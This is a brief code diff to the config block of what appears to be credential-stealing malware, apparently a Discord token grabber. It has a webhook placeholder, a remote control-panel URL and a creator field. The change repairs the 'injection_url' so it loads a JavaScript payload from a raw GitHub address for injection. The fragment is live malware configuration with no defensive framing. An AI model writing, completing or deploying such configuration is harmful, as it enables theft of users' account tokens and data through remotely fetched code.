@@ -16,7 +16,7 @@ var config = {
     "embed-color": 16711718,
 
     creator: "%NAME_CREATOR%",
-    injection_url: "https://raw.githubusercontent.com/NexusTestGithub/test/main/index.j",
+    injection_url: "https://raw.githubusercontent.com/NexusTestGithub/test/main/index.js",
     webhook: "%WEBHOOK%",
     uwu: "https://panel.sordeal.net:3000/",
     Filter: {
